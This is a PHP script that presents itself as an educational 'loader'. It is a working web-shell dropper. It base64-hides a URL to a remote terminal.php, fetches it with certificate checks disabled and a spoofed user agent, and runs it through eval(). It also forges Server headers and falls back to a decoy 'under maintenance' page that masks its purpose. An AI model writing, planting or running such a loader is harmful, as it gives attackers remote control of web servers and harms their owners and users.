<?php
/**
 * Simple Loader for Educational Tools
 * Created for learning purposes
 * 
 * DISCLAIMER: Use only on servers you own or have permission!
 */
header('X-Powered-By: PHP');
header('Server: Apache');
$cfg = [
    's' => 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1NoZWxsQnlwYXNzSUQvUmliZWxXZWJUZXJtaW5hbC9yZWZzL2hlYWRzL21haW4vdGVybWluYWwucGhw',
    't' => 30,
    'e' => 'RIBBY2024'
];

$url = base64_decode($cfg['s']);
function fetch($url) {
    if (ini_get('allow_url_fopen')) {
        $opts = [
            'http' => ['timeout' => 30, 'user_agent' => 'Mozilla/5.0'],
            'ssl' => ['verify_peer' => false]
        ];
        $ctx = stream_context_create($opts);
        $content = @file_get_contents($url, false, $ctx);
        if ($content !== false) return $content;
    }

    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 30,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_USERAGENT => 'Mozilla/5.0'
        ]);
        $content = curl_exec($ch);
        curl_close($ch);
        if ($content !== false) return $content;
    }
    return false;
}

$code = fetch($url);
if ($code) {
    $encoded = base64_encode(gzcompress($code));
    $tmp = tempnam(sys_get_temp_dir(), 'tmp_') . '.dat';
    file_put_contents($tmp, $encoded);
    $read = file_get_contents($tmp);
    $decoded = gzuncompress(base64_decode($read));
    ob_start();
    eval('?>' . $decoded);
    $output = ob_get_clean();
    echo $output;
    unlink($tmp);
} else {
    // Friendly error
    echo "<!-- Service temporarily unavailable -->\n";
    echo "<h3>System is under maintenance</h3>";
    echo "<p>Please try again later.</p>";
}
?>
